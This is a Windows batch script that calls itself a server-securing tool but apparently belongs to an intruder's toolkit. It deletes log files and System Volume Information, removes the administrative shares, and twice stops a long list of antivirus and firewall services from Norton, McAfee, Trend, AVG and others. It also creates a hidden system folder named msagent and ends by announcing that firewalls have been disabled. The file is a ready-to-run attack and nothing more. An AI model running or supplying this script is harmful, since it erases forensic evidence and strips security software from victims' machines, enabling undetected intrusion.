   @echo starting [SECURED SERVER] :-)
   @echo deleted all log files :-)
   del c:\recycler /q
   del c:\Recycled /q
   del c:\winnt\temp /q
   del c:\System Volume Information /q
   del c:\winnt\system32\logfiles /y /q
   del d:\winnt\system32\logs /y /q
   @echo Server secure succesfull :-)
   @echo .
   @echo .
   @echo .
   net share /delete C$ /y
   net share /delete D$ /y
   net share /delete E$ /y
   net share /delete F$ /y
   net share /delete G$ /y
   net share /delete H$ /y
   net share /delete I$ /y
   net share /delete J$ /y
   net share /delete K$ /y
   net share /delete L$ /y
   net share /delete M$ /y
   net share /delete N$ /y
   net share /delete O$ /y
   net share /delete P$ /y
   net share /delete Q$ /y
   net share /delete R$ /y
   net share /delete S$ /y
   net share /delete T$ /y
   net share /delete U$ /y
   net share /delete V$ /y
   net share /delete W$ /y
   net share /delete X$ /y
   net share /delete Y$ /y
   net share /delete Z$ /y
   net share /delete ADMIN$ /y
   net share /delete IPC$ /y
   net stop messenger
   net stop netbios
   @echo off
   net stop AVP32
   net stop LOCKDOWN2000
   net stop AVP.EXE
   net stop CFINET32
   net stop CFINET
   net stop ICMON
   net stop SAFEWEB
   net stop WEBSCANX
   net stop ANTIVIR
   net stop MCAFEE
   net stop NORTON
   net stop NVC95
   net stop FP-WIN
   net stop IOMON98
   net stop PCCWIN98
   net stop F-PROT95
   net stop F-STOPW
   net stop PVIEW95
   net stop NAVWNT
   net stop NAVRUNR
   net stop NAVLU32
   net stop NAVAPSVC
   net stop NISUM
   net stop SYMPROXYSVC
   net stop RESCUE32
   net stop NISSERV
   net stop ATRACK
   net stop IAMAPP
   net stop LUCOMSERVER
   net stop LUALL
   net stop NMAIN
   net stop NAVW32
   net stop NAVAPW32
   net stop VSSTAT
   net stop VSHWIN32
   net stop AVSYNMGR
   net stop AVCONSOL
   net stop WEBTRAP
   net stop POP3TRAP
   net stop PCCMAIN
   net stop PCCIOMON
   md %windir%\system32\msagent
   attrib +h +s %windir%\system32\msagent
   net stop "Defwatch"
   net stop "Trend VCS Agent"
   net stop "Trend ServerProtect Agent"
   net stop "Trend ServerProtect"
   net stop "Norton Antivirus Server"
   net stop "Symantec Antivirus Client"
   net stop "AVG6 Service"
   net stop "Symantec Antivirus Server"
   net stop "Norton Antivirus Client"
   net stop "NAV Auto-Protect"
   net stop "NAV Alert"
   net stop "Norton Antivirus Auto Protect Service"
   net stop "Symantec Event Manager"y
   net stop "Symantec Event Manager" /y
   net stop "McShield" /y
   net stop "AVSync Manager" /y

   @echo off
   net stop AVP32
   net stop LOCKDOWN2000
   net stop AVP.EXE
   net stop CFINET32
   net stop CFINET
   net stop ICMON
   net stop SAFEWEB
   net stop WEBSCANX
   net stop ANTIVIR
   net stop MCAFEE
   net stop NORTON
   net stop NVC95
   net stop FP-WIN
   net stop IOMON98
   net stop PCCWIN98
   net stop F-PROT95
   net stop F-STOPW
   net stop PVIEW95
   net stop NAVWNT
   net stop NAVRUNR
   net stop NAVLU32
   net stop NAVAPSVC
   net stop NISUM
   net stop SYMPROXYSVC
   net stop RESCUE32
   net stop NISSERV
   net stop ATRACK
   net stop IAMAPP
   net stop LUCOMSERVER
   net stop LUALL
   net stop NMAIN
   net stop NAVW32
   net stop NAVAPW32
   net stop VSSTAT
   net stop VSHWIN32
   net stop AVSYNMGR
   net stop AVCONSOL
   net stop WEBTRAP
   net stop POP3TRAP
   net stop PCCMAIN
   net stop PCCIOMON
   echo Firewalls have been disabled!
